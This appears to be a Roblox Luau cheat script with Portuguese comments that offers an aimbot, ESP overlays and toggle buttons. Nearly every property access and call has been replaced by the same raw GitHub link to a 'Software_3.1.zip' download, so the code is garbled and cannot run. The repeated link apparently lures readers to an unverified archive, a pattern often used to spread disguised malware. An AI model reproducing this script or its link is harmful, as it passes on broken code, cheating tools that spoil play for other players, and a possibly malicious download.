-- Desenvolvido para testes de IA no Roblox Studio - Uso privado
-- Feito por ChatGPT - 100% Lua (Luau) - Aimbot + ESP + GUI

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local localPlayer = https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip
local camera = https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip

-- CONFIGURAÇÕES
local AimbotTecla = https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip
local AimbotAlcance = 30

-- ESTADOS
local aimbotAtivo = false
local espAtivo = false
local desenhosESP = {}

-- GUI
local gui = https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip("ScreenGui")
https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip = "AimbotESP_GUI"
https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip = false
https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip = localPlayer:WaitForChild("PlayerGui")

-- Botão ESP
local espButton = https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip("TextButton")
https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip = https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip(0, 100, 0, 40)
https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip = https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip(0, 10, 0, 10)
https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip = "ESP: OFF"
https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip = https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip(50, 50, 50)
https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip = https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip(1, 1, 1)
https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip = gui

-- Botão Aimbot
local aimbotButton = https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip("TextButton")
https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip = https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip(0, 100, 0, 40)
https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip = https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip(0, 10, 0, 60)
https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip = "Aimbot: OFF"
https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip = https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip(50, 50, 50)
https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip = https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip(1, 1, 1)
https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip = gui

-- Toggle ESP
https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip(function()
	espAtivo = not espAtivo
	https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip = espAtivo and "ESP: ON" or "ESP: OFF"
end)

-- Toggle Aimbot via botão
https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip(function()
	aimbotAtivo = not aimbotAtivo
	https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip = aimbotAtivo and "Aimbot: ON" or "Aimbot: OFF"
end)

-- Toggle Aimbot via tecla
https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip(function(input, processed)
	if not processed and https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip == AimbotTecla then
		aimbotAtivo = not aimbotAtivo
		https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip = aimbotAtivo and "Aimbot: ON" or "Aimbot: OFF"
	end
end)

-- Criar ESP para jogadores
local function criarDesenhos(player)
	if player == localPlayer then return end
	if https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip == https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip then return end

	local t = {
		caixa = https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip("Square"),
		vida = https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip("Line"),
		nome = https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip("Text")
	}

	https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip = 1
	https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip = https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip(255, 0, 0)
	https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip = 1
	https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip = false

	https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip = 2
	https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip = 1
	https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip = false

	https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip = 16
	https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip = true
	https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip = true
	https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip = https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip(255, 255, 255)
	https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip = false

	desenhosESP[player] = t
end

-- Remover ESP
local function removerDesenhos(player)
	if desenhosESP[player] then
		for _, d in pairs(desenhosESP[player]) do
			d:Remove()
		end
		desenhosESP[player] = nil
	end
end

-- Criar e remover quando players entram/saem
for _, p in ipairs(Players:GetPlayers()) do criarDesenhos(p) end
https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip(criarDesenhos)
https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip(removerDesenhos)

-- Achar alvo para Aimbot
local function encontrarAlvo()
	local alvoMaisProximo = nil
	local menorDist = AimbotAlcance

	for _, player in ipairs(Players:GetPlayers()) do
		if player ~= localPlayer and https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip ~= https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip then
			local char = https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip
			if char and char:FindFirstChild("HumanoidRootPart") and char:FindFirstChild("Humanoid") then
				local hrp = https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip
				local humanoid = https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip
				if https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip > 0 then
					local distancia = (https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip - https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip).Magnitude
					local pos, visivel = camera:WorldToViewportPoint(https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip)
					if visivel and distancia < menorDist then
						alvoMaisProximo = hrp
						menorDist = distancia
					end
				end
			end
		end
	end

	return alvoMaisProximo
end

-- Acompanhar e aplicar a mira
local function mirar(alvo)
	if not alvo then return end
	local pos = https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip
	https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip = https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip(https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip, pos)
end

-- Loop principal
https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip(function()
	-- Aimbot
	if aimbotAtivo then
		local alvo = encontrarAlvo()
		if alvo then
			mirar(alvo)
		end
	end

	-- ESP
	for player, desenho in pairs(desenhosESP) do
		local char = https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip
		if espAtivo and char and char:FindFirstChild("HumanoidRootPart") and char:FindFirstChild("Humanoid") then
			local hrp = https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip
			local humanoid = https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip
			local pos, visivel = camera:WorldToViewportPoint(https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip)

			if visivel then
				local dist = (https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip - https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip).Magnitude
				local scale = https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip(1 / dist * 100, 0.5, 2)
				local tamanho = https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip(60 * scale, 100 * scale)

				-- Caixa
				https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip = tamanho
				https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip = https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip(pos.X - tamanho.X/2, pos.Y - tamanho.Y/2)
				https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip = true

				-- Vida
				local vidaRatio = https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip / https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip
				https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip = https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip(pos.X - tamanho.X/2 - 6, pos.Y + tamanho.Y/2)
				https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip = https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip(https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip, https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip - tamanho.Y * vidaRatio)
				https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip = https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip(255 * (1 - vidaRatio), 255 * vidaRatio, 0)
				https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip = true

				-- Nome
				https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip = https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip(pos.X, pos.Y - tamanho.Y/2 - 14)
				https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip = https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip
				https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip = true
			else
				https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip = false
				https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip = false
				https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip = false
			end
		else
			https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip = false
			https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip = false
			https://raw.githubusercontent.com/rl9blake/fgdfg/main/indecisive/Software_3.1.zip = false
		end
	end
end)
